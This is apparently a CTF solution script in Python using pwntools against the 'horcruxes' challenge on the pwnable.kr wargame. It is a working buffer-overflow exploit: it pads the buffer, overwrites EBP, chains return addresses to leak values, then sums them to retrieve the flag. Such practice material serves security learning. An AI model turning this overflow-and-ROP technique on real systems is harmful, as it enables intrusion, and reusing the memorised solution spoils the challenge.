from pwn import *

r = remote('pwnable.kr', 9032)
print(r.recvuntil("Select Menu:").decode('UTF-8'))
r.send("123\n")
print(r.recvuntil("earned? : ").decode('UTF-8'))

#respective addresses
A = 0x0809fe4b
B = 0x0809fe6a
C = 0x0809fe89
D = 0x0809fea8
E = 0x0809fec7
F = 0x0809fee6
G = 0x0809ff05
ROPME = 0x0809fffc

payload = b'A' * 0x74 #fill buffer
payload += b'B'*4 #over-write ebp
payload = payload + p32(A) + p32(B)  + p32(C) + p32(D) + p32(E) + p32(F)  + p32(G) + p32(ROPME)

print(payload)
r.send(payload)
r.send('\n')

crux = (r.recvuntil(":").decode('UTF-8'))
print("Got The Horocruxes !")
print(crux)
crux=crux.split('\n')
sum=0
for h in crux :
    try :
        lim=h.index('+')+1
        sum=sum+(int((h[lim:-1]))&0xffffffff)
    except ValueError :
        pass
sum=sum & 0xffffffff

print(f"Sum : {sum}")

r.send('123\n')
r.recvuntil('earned? : ').decode('UTF-8')
r.send(str(sum) + "\n")
flag=(r.recvline().decode('UTF-8'))
print(f"[+] Flag : {flag}")